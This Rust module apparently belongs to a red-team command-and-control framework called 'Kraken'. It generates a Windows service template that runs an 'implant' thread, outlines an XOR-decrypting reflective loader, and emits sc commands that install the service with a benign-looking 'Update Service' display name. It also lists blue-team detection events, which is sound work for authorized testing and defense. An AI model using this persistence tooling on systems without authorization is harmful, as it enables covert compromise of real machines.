//! Windows service EXE template generator.
//!
//! Produces a Rust source template for a Windows service binary that:
//! 1. Registers `ServiceMain` with the Service Control Manager (SCM)
//! 2. Reports `SERVICE_RUNNING` status
//! 3. Spawns the implant in a background thread
//! 4. Handles `SERVICE_CONTROL_STOP` for graceful shutdown
//!
//! The generated source is meant to be cross-compiled with
//! `cargo build --target x86_64-pc-windows-gnu`.
//!
//! ## MITRE ATT&CK
//! - T1543.003: Create or Modify System Process: Windows Service
//!
//! ## Detection (Blue Team)
//! - Event 7045: New service installed
//! - Event 4697: Security audit — service installed
//! - Event 7036: Service state change
//! - Sigma: service binary in unusual path

use crate::BuilderError;
use serde::{Deserialize, Serialize};

/// Configuration for service EXE generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServiceConfig {
    /// Windows service name (used with `sc create`).
    pub service_name: String,
    /// Human-readable display name shown in `services.msc`.
    pub display_name: String,
    /// Path to the implant PE to embed (informational — included as a comment).
    pub payload_path: String,
}

impl Default for ServiceConfig {
    fn default() -> Self {
        Self {
            service_name: "KrakenSvc".into(),
            display_name: "Kraken Update Service".into(),
            payload_path: String::new(),
        }
    }
}

/// Generated service EXE artefacts.
#[derive(Debug, Clone)]
pub struct ServiceOutput {
    /// Rust source template for the service binary.
    pub source: String,
    /// Cargo.toml snippet for the service crate.
    pub cargo_toml: String,
    /// Install commands (sc create / sc start).
    pub install_commands: String,
}

/// Generate a Windows service EXE template.
pub fn generate_service_template(config: &ServiceConfig) -> Result<ServiceOutput, BuilderError> {
    let source = generate_source(config);
    let cargo_toml = generate_cargo_toml(config);
    let install_commands = generate_install_commands(config);

    Ok(ServiceOutput {
        source,
        cargo_toml,
        install_commands,
    })
}

fn generate_source(config: &ServiceConfig) -> String {
    format!(
        r#"//! Kraken C2 — Windows Service EXE template
//!
//! Service name : {service_name}
//! Display name : {display_name}
//!
//! MITRE ATT&CK: T1543.003 (Windows Service)
//!
//! Cross-compile:
//!   cargo build --target x86_64-pc-windows-gnu --release
//!
//! Install:
//!   sc create {service_name} binPath= "C:\path\to\service.exe" start= auto
//!   sc start {service_name}

#![cfg_attr(not(test), windows_subsystem = "console")]

use std::ffi::OsString;
use std::sync::atomic::{{AtomicBool, Ordering}};
use std::sync::Arc;
use std::time::Duration;

// Global stop signal shared between the control handler and ServiceMain.
static STOP_SIGNAL: AtomicBool = AtomicBool::new(false);

fn main() {{
    // The SCM invokes the service entry point table.
    // For a single-service EXE, we register one entry.
    unsafe {{
        let service_name: Vec<u16> = "{service_name}\0"
            .encode_utf16()
            .collect();

        // In production, call StartServiceCtrlDispatcherW here.
        // For the template, we call service_main directly for testing.
        service_main(0, std::ptr::null_mut());
    }}
}}

/// Entry point called by the SCM (or directly for testing).
unsafe fn service_main(_argc: u32, _argv: *mut *mut u16) {{
    // 1. Register control handler
    //    In production: RegisterServiceCtrlHandlerW(service_name, handler_fn)
    //    The handler sets STOP_SIGNAL on SERVICE_CONTROL_STOP.

    // 2. Report SERVICE_RUNNING
    //    SetServiceStatus(SERVICE_RUNNING, ...)

    // 3. Spawn implant thread
    let implant_handle = std::thread::spawn(|| {{
        implant_entry();
    }});

    // 4. Wait for stop signal
    while !STOP_SIGNAL.load(Ordering::Relaxed) {{
        std::thread::sleep(Duration::from_millis(500));
    }}

    // 5. Report SERVICE_STOPPED
    //    SetServiceStatus(SERVICE_STOPPED, ...)
}}

/// Implant entry point — runs in a background thread.
fn implant_entry() {{
    // TODO: Insert decryption + reflective loader here.
    //
    // 1. Locate embedded payload (compile-time include_bytes! or resource)
    // 2. XOR-decrypt with embedded key
    // 3. Reflectively load PE (headers, sections, relocs, imports)
    // 4. Jump to entry point
    //
    // Payload path hint: {payload_path}

    // Keep thread alive (placeholder).
    loop {{
        if STOP_SIGNAL.load(std::sync::atomic::Ordering::Relaxed) {{
            break;
        }}
        std::thread::sleep(Duration::from_secs(1));
    }}
}}

/// Service control handler callback.
///
/// Called by the SCM when the service receives a control code
/// (STOP, PAUSE, INTERROGATE, etc.).
unsafe fn service_control_handler(control: u32) {{
    const SERVICE_CONTROL_STOP: u32 = 0x00000001;
    const SERVICE_CONTROL_INTERROGATE: u32 = 0x00000004;

    match control {{
        SERVICE_CONTROL_STOP => {{
            STOP_SIGNAL.store(true, Ordering::Relaxed);
        }}
        SERVICE_CONTROL_INTERROGATE => {{
            // Report current status (no-op in template).
        }}
        _ => {{}}
    }}
}}

#[cfg(test)]
mod tests {{
    use super::*;

    #[test]
    fn test_stop_signal_default_false() {{
        assert!(!STOP_SIGNAL.load(Ordering::Relaxed));
    }}
}}
"#,
        service_name = config.service_name,
        display_name = config.display_name,
        payload_path = config.payload_path,
    )
}

fn generate_cargo_toml(config: &ServiceConfig) -> String {
    format!(
        r#"[package]
name = "{name}"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "{name}"
path = "src/main.rs"

[dependencies]
# Add windows-sys for production service API calls:
# windows-sys = {{ version = "0.52", features = ["Win32_System_Services"] }}

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
"#,
        name = config
            .service_name
            .to_ascii_lowercase()
            .replace(' ', "-"),
    )
}

fn generate_install_commands(config: &ServiceConfig) -> String {
    format!(
        r#":: Kraken C2 — Service installation commands
:: Run from an elevated (Administrator) command prompt.
::
:: Detection: Event 7045, Event 4697

:: Install the service (auto-start)
sc create {name} binPath= "C:\Windows\Temp\{name}.exe" start= auto DisplayName= "{display}"

:: Start the service
sc start {name}

:: Verify
sc query {name}

:: Cleanup (after engagement)
sc stop {name}
sc delete {name}
del "C:\Windows\Temp\{name}.exe"
"#,
        name = config.service_name,
        display = config.display_name,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_service_template() {
        let config = ServiceConfig::default();
        let output = generate_service_template(&config).unwrap();
        assert!(!output.source.is_empty());
        assert!(!output.cargo_toml.is_empty());
        assert!(!output.install_commands.is_empty());
    }

    #[test]
    fn test_source_contains_service_name() {
        let config = ServiceConfig {
            service_name: "TestSvc".into(),
            display_name: "Test Service".into(),
            payload_path: String::new(),
        };
        let output = generate_service_template(&config).unwrap();
        assert!(output.source.contains("TestSvc"));
        assert!(output.source.contains("Test Service"));
    }

    #[test]
    fn test_source_contains_service_main() {
        let config = ServiceConfig::default();
        let output = generate_service_template(&config).unwrap();
        assert!(output.source.contains("service_main"));
    }

    #[test]
    fn test_source_contains_control_handler() {
        let config = ServiceConfig::default();
        let output = generate_service_template(&config).unwrap();
        assert!(output.source.contains("service_control_handler"));
        assert!(output.source.contains("SERVICE_CONTROL_STOP"));
    }

    #[test]
    fn test_source_contains_implant_entry() {
        let config = ServiceConfig::default();
        let output = generate_service_template(&config).unwrap();
        assert!(output.source.contains("implant_entry"));
    }

    #[test]
    fn test_cargo_toml_has_package() {
        let config = ServiceConfig::default();
        let output = generate_service_template(&config).unwrap();
        assert!(output.cargo_toml.contains("[package]"));
        assert!(output.cargo_toml.contains("krakensvc")); // lowercased
    }

    #[test]
    fn test_install_commands_has_sc_create() {
        let config = ServiceConfig {
            service_name: "MySvc".into(),
            display_name: "My Service".into(),
            payload_path: String::new(),
        };
        let output = generate_service_template(&config).unwrap();
        assert!(output.install_commands.contains("sc create MySvc"));
        assert!(output.install_commands.contains("sc start MySvc"));
        assert!(output.install_commands.contains("sc delete MySvc"));
    }

    #[test]
    fn test_payload_path_in_source() {
        let config = ServiceConfig {
            payload_path: "/tmp/implant.exe".into(),
            ..ServiceConfig::default()
        };
        let output = generate_service_template(&config).unwrap();
        assert!(output.source.contains("/tmp/implant.exe"));
    }
}
